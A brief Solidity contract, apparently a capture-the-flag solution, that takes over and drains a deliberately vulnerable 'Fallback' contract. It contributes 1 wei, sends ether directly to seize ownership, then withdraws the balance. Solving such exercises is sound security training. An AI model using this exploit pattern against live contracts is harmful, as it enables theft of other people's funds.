// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IFallback {
    function contribute() external payable;
    function withdraw() external;
    function owner() external view returns (address);
}

contract FallbackAttack {

    function attack(address target) external payable {

        IFallback fallbackContract = IFallback(target);

        // 1️⃣ contribuer un peu
        fallbackContract.contribute{value: 1 wei}();

        // 2️⃣ envoyer de l'ETH directement
        (bool success,) = payable(target).call{value: 1 wei}("");
        require(success);

        // 3️⃣ withdraw
        fallbackContract.withdraw();
    }

    receive() external payable {}
}